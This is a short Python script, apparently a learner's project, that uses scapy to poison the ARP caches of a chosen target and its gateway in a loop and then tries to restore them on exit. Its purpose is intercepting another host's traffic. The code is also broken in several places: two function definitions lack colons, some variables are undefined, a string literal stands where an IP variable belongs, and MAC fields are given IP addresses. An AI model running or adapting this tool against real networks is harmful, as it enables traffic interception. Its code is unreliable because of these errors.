import scapy.all as scapy
import time
import optparse

def get_mac_adress(ip):
    arp_request_packet = scapy.ARP(pdst="ip")
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet=broadcast_packet/arp_request_packet
    answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc



def arp_poising(target_ip,poisoned_ip)
    target_mac = get_mac_adress(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_ip,psrc=poisoned_ip,)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP) 

def reset_operation(fooled_ip,gateway_ip)
    fooled_ip = get_mac_adress(gateway_ip)
    arp_response = scapy.ARP(op=2,pdst=fooled_ip_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_ip)
    scapy.send(arp_response,verbose=False,count=5)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter you Gateway")
    options=parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter your target IP")
    if not options.gateway_ip:
        print("Enter you Gateway IP")

    return options

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

number = 0

try:
    while True:
        arp_poising(user_target_ip,user_gateway_ip)
        arp_poising(user_gateway_ip,user_target_ip)

        number += 2

        print("sending fucking packets" + str(number))
        time.sleep(3)

except KeyboardInterrupt:
    print("Quit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)






